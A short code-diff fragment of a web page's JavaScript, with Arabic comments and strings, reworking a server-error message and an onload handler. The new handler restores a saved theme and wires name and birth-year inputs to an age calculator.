-      status.innerText = "❌ تعذر الاتصال بالخادم.";
-      status.style.color = "#ff4757";
+      status.innerText = '❌ تعذر الاتصال بالخادم.';
+      status.style.color = '#ff4757';
     });
   }
 
-  // ===== 10. تشغيل عند التحميل =====
+  // ===== التحميل =====
   window.onload = function() {
-    // استعادة الثيم
-    const savedTheme = localStorage.getItem('themeIndex') || '0';
-    currentTheme = parseInt(savedTheme);
-    document.documentElement.setAttribute('data-theme', THEMES[currentTheme]);
+    const saved = localStorage.getItem('theme');
+    if (saved) { currentTheme = parseInt(saved); document.documentElement.setAttribute('data-theme', THEMES[currentTheme]); }
     document.querySelector('.toolbar button:first-child').textContent = `🎨 ${THEME_NAMES[currentTheme]}`;
-
-    collectDetailedInfo();
+    collectInfo();
     document.getElementById('yearInput').addEventListener('input', calculateAgeAndShow);
     document.getElementById('nameInput').addEventListener('input', calculateAgeAndShow);
   };
